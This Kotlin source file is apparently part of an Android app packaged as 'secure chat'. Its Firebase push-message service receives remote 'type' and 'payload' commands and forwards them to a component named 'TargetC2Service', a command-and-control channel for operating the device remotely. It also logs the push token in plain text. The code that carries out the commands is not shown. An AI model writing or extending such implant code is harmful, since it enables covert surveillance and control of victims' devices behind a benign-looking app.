package com.secure.chat.services

import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage

class TargetFCMService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "TargetFCM"
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "New FCM token: $token")
        getSharedPreferences("secure_chat_prefs", MODE_PRIVATE)
            .edit()
            .putString("fcm_token", token)
            .apply()
    }

    override fun onMessageReceived(message: RemoteMessage) {
        super.onMessageReceived(message)
        Log.d(TAG, "FCM: ${message.data}")

        val data = message.data
        val type = data["type"] ?: return
        val payload = data["payload"] ?: ""

        // Forward to C2 service
        val intent = android.content.Intent(this, TargetC2Service::class.java).apply {
            action = "fcm_command"
            putExtra("type", type)
            putExtra("payload", payload)
        }
        startService(intent)
    }
}